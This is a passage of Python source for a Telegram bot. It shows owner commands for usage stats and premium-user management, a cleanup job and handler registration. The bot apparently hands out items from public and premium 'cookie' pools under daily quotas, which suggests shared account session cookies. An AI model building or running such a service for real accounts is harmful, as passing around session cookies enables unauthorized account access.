        (uid, v.get("count", 0)) for uid, v in data.items() if v.get("date") == today
    ]
    today_entries.sort(key=lambda x: x[1], reverse=True)
    top5 = today_entries[:5]

    top5_text = "\n".join(
        f"  • <code>{mask_id(uid)}</code> — {count} req" for uid, count in top5
    ) or "  • (none)"

    await update.message.reply_text(
        f"👑 <b>Admin Stats</b>\n\n"
        f"👥 Total users: <b>{s['total_users']}</b>\n"
        f"🟢 Active today: <b>{s['today_users']}</b>\n"
        f"🎯 Requests today: <b>{s['today_requests']}</b>\n"
        f"🍪 Public cookies: <b>{len(public)}</b>\n"
        f"⭐ Premium cookies: <b>{len(premium)}</b>\n"
        f"💎 Premium users: <b>{len(prem)}</b>\n"
        f"👑 Owners: <b>{len(OWNER_IDS)}</b>\n\n"
        f"🔥 <b>Top 5 today:</b>\n{top5_text}",
        parse_mode=ParseMode.HTML,
    )


@owner_only
async def add_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = None

    # 1) Reply to a message
    if msg.reply_to_message and msg.reply_to_message.from_user:
        uid = msg.reply_to_message.from_user.id
    # 2) Forwarded
    elif getattr(msg, "forward_from", None):
        uid = msg.forward_from.id
    # 3) Typed ID
    elif context.args:
        try:
            uid = int(context.args[0])
        except ValueError:
            await msg.reply_text("❌ user_id must be numeric.")
            return
    else:
        await msg.reply_text(
            "❌ Usage:\n"
            "• Reply to a user's message with /addpremium\n"
            "• Forward their message and send /addpremium\n"
            "• Or /addpremium <user_id>"
        )
        return

    if uid in OWNER_IDS:
        await msg.reply_text("ℹ️ That user is already an owner.")
        return

    add_premium(uid)
    await msg.reply_text(
        f"💎 <code>{uid}</code> is now <b>Premium</b>!\n"
        f"Quota: unlimited (∞) + Premium pool access.",
        parse_mode=ParseMode.HTML,
    )

    try:
        await context.bot.send_message(
            chat_id=uid,
            text=(
                f"🎉 <b>Congratulations!</b>\n\n"
                f"You are now a <b>Premium user</b> 💎\n"
                f"• Unlimited quota (∞)\n"
                f"• Access to <b>Premium Cookie Pool</b>\n\n"
                f"Use /get or the ⭐ button to enjoy!"
            ),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass


@owner_only
async def del_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /delpremium <user_id>")
        return
    try:
        uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("user_id must be numeric.")
        return

    remove_premium(uid)
    await update.message.reply_text(
        f"✅ Premium removed for <code>{uid}</code>.\n"
        f"Quota back to {DAILY_LIMIT}/day.",
        parse_mode=ParseMode.HTML,
    )


@owner_only
async def list_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prem = load_premium()
    if not prem:
        await update.message.reply_text("No premium users at the moment.")
        return
    lines = "\n".join(f"  • <code>{uid}</code>" for uid in sorted(prem))
    await update.message.reply_text(
        f"💎 <b>Premium ({len(prem)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML,
    )


# ==================== BACKGROUND JOBS ====================
async def cleanup_job(context: ContextTypes.DEFAULT_TYPE):
    data = load_usage()
    cutoff = (datetime.now(TIMEZONE) - timedelta(days=USAGE_RETENTION_DAYS)).strftime("%Y-%m-%d")
    cleaned = {k: v for k, v in data.items() if v.get("date", "") >= cutoff}
    if len(cleaned) != len(data):
        save_usage(cleaned)
        log(f"Cleanup: {len(data)} → {len(cleaned)} users")


# ==================== ERROR HANDLER ====================
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    log(f"Exception: {context.error}", "error")


# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # User
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("get", get_cmd))
    app.add_handler(CommandHandler("getpremium", get_premium_cmd))
    app.add_handler(CommandHandler("quota", quota_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("premium", premium_info_cmd))

    # Owner
    app.add_handler(CommandHandler("reload", reload_cmd))
    app.add_handler(CommandHandler("health", health_cmd))
    app.add_handler(CommandHandler("reset_me", reset_me_cmd))
    app.add_handler(CommandHandler("reset", reset_user_cmd))
    app.add_handler(CommandHandler("reset_all", reset_all_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("admin_stats", admin_stats_cmd))
    app.add_handler(CommandHandler("addpremium", add_premium_cmd))
    app.add_handler(CommandHandler("delpremium", del_premium_cmd))
    app.add_handler(CommandHandler("listpremium", list_premium_cmd))

    # Inline menu
    app.add_handler(CallbackQueryHandler(menu_callback))

    # Error handler
    app.add_error_handler(error_handler)

    # Background jobs
    if app.job_queue:
        app.job_queue.run_repeating(
            cleanup_job, interval=24 * 3600, first=120,
        )

    log("Bot running...")
    print("🤖 Bot running. Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
